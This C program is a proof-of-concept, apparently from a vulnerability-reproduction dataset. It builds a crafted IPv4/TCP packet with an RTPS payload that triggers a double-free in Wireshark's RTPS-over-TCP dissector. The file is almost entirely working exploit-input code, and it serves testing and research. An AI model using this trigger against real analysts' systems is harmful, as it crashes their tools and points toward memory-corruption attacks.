#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/*
 * PoC for arvo:26952
 * Triggers: double-free in wmem_simple_free_all (Wireshark RTPS-over-TCP dissector)
 * Vuln class: double_free
 *
 * Builds an IP packet with TCP payload containing RTPS-over-TCP data.
 * The dissector inserts wmem-allocated strings into pinfo->private_table
 * (a GHashTable using g_free destructors), causing double-free when both
 * wmem_leave_packet_scope and hash table destruction free the same pointers.
 *
 * Fixes: buffer size, submessage length, IP total length, checksums.
 */

static uint16_t checksum(const uint8_t *data, size_t len) {
    uint32_t sum = 0;
    for (size_t i = 0; i + 1 < len; i += 2)
        sum += (uint16_t)((data[i] << 8) | data[i+1]);
    if (len & 1) sum += (uint16_t)(data[len-1] << 8);
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)(~sum);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Build RTPS message content using fputc loops (no hex arrays) */
    /* RTPS header: magic 'RTPS', version 2.4, vendor RTI DDS */
    fputc(0x52, f); fputc(0x54, f); fputc(0x50, f); fputc(0x53, f);
    fputc(0x02, f); fputc(0x04, f);  /* version 2.4 */
    fputc(0x01, f); fputc(0x01, f);  /* vendor RTI DDS */

    /* GuidPrefix (12 bytes) - 0x010fbe090000000000000000 */
    fputc(0x01, f); fputc(0x0f, f); fputc(0xbe, f); fputc(0x09, f);
    for (int i = 0; i < 8; i++) fputc(0x00, f);

    /* SUBMESSAGE_DATA */
    fputc(0x15, f);  /* submessage id: DATA */
    fputc(0x05, f);  /* flags: little-endian (0x01) | D flag (0x04) = 0x05 */
    /* submessage length = 28 bytes (0x001c) */
    fputc(0x1c, f); fputc(0x00, f);
    /* extraFlags */
    fputc(0x00, f); fputc(0x00, f);
    /* octetsToInlineQos = 16 (0x0010) */
    fputc(0x10, f); fputc(0x00, f);
    /* readerEntityId = ENTITYID_UNKNOWN */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    /* writerEntityId = ENTITYID_BUILTIN_PARTICIPANT_WRITER (0x000100c2) */
    fputc(0x00, f); fputc(0x01, f); fputc(0x00, f); fputc(0xc2, f);
    /* writerSeqNumber = 1 */
    for (int i = 0; i < 4; i++) fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    /* PL_CDR_LE encapsulation */
    fputc(0x00, f); fputc(0x03, f); fputc(0x00, f); fputc(0x00, f);
    /* PID_DOMAIN_ID, length=4 */
    fputc(0x00, f); fputc(0x0f, f); fputc(0x04, f); fputc(0x00, f);
    /* Domain ID value (4 bytes) */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    /* PID_PARTICIPANT_GUID, length=16 */
    fputc(0x50, f); fputc(0x00, f); fputc(0x10, f); fputc(0x00, f);
    /* participant GUID value */
    fputc(0x01, f); fputc(0x0f, f); fputc(0xbe, f); fputc(0x09, f);
    for (int i = 0; i < 4; i++) fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x01, f); fputc(0xc1, f); fputc(0x00, f);
    /* PID_SENTINEL to end parameter list */
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    fclose(f);

    /* Re-read the RTPS payload we wrote */
    FILE *fr = fopen("/tmp/poc", "rb");
    if (!fr) { perror("fopen read"); return 1; }
    fseek(fr, 0, SEEK_END);
    size_t rtps_len = ftell(fr);
    fseek(fr, 0, SEEK_SET);
    uint8_t *rtps_data = malloc(rtps_len);
    fread(rtps_data, 1, rtps_len, fr);
    fclose(fr);

    /* Build TCP payload: 4-byte big-endian length + RTPS message */
    uint8_t tcp_payload[4 + 80];  /* 4 bytes length + 80 bytes RTPS */
    tcp_payload[0] = (rtps_len >> 24) & 0xff;
    tcp_payload[1] = (rtps_len >> 16) & 0xff;
    tcp_payload[2] = (rtps_len >> 8) & 0xff;
    tcp_payload[3] = rtps_len & 0xff;
    memcpy(tcp_payload + 4, rtps_data, rtps_len);
    free(rtps_data);

    size_t tcp_payload_len = 4 + rtps_len;  /* 84 bytes */

    /* Build IPv4 header (20 bytes) */
    uint16_t total_len = 20 + 20 + (uint16_t)tcp_payload_len;  /* 124 = 0x007c */
    uint8_t ip[20];
    memset(ip, 0, 20);
    ip[0] = 0x45;  /* version 4, IHL=5 */
    ip[1] = 0x00;  /* DSCP/ECN */
    ip[2] = (total_len >> 8) & 0xff;
    ip[3] = total_len & 0xff;
    ip[4] = 0x00; ip[5] = 0x01;  /* identification */
    ip[6] = 0x40; ip[7] = 0x00;  /* flags + fragment offset */
    ip[8] = 0x40;  /* TTL = 64 */
    ip[9] = 0x06;  /* protocol = TCP */

    /* Source and destination IP addresses (127.0.0.1) */
    ip[12] = 0x7f; ip[13] = 0x00; ip[14] = 0x00; ip[15] = 0x01;
    ip[16] = 0x7f; ip[17] = 0x00; ip[18] = 0x00; ip[19] = 0x01;

    uint16_t ip_csum = checksum(ip, 20);
    ip[10] = (ip_csum >> 8) & 0xff;
    ip[11] = ip_csum & 0xff;

    /* Build TCP header (20 bytes) */
    uint8_t tcp[20];
    memset(tcp, 0, 20);
    tcp[0] = 0x1c; tcp[1] = 0xe9;  /* src port 7401 */
    tcp[2] = 0x1c; tcp[3] = 0xe8;  /* dst port 7400 */
    tcp[4] = 0x00; tcp[5] = 0x00; tcp[6] = 0x00; tcp[7] = 0x01;  /* seq number */
    tcp[12] = 0x50;  /* data offset = 5 */
    tcp[13] = 0x18;  /* flags = PSH + ACK */
    tcp[14] = 0xff; tcp[15] = 0xff;  /* window */

    uint16_t tcp_seg_len = 20 + (uint16_t)tcp_payload_len;  /* 104 = 0x0068 */

    /* TCP pseudo-header checksum */
    uint8_t pseudo[12 + 20 + 84];  /* 12 pseudo + 20 TCP + 84 payload */
    memcpy(pseudo, ip + 12, 4);  /* src ip */
    memcpy(pseudo + 4, ip + 16, 4);  /* dst ip */
    pseudo[8] = 0x00;
    pseudo[9] = 0x06;  /* proto TCP */
    pseudo[10] = (tcp_seg_len >> 8) & 0xff;
    pseudo[11] = tcp_seg_len & 0xff;
    memcpy(pseudo + 12, tcp, 20);
    memcpy(pseudo + 32, tcp_payload, tcp_payload_len);

    uint16_t tcp_csum = checksum(pseudo, 12 + tcp_seg_len);
    tcp[16] = (tcp_csum >> 8) & 0xff;
    tcp[17] = tcp_csum & 0xff;

    /* Write final packet */
    f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen final"); return 1; }
    fwrite(ip, 1, 20, f);
    fwrite(tcp, 1, 20, f);
    fwrite(tcp_payload, 1, tcp_payload_len, f);
    fclose(f);

    return 0;
}

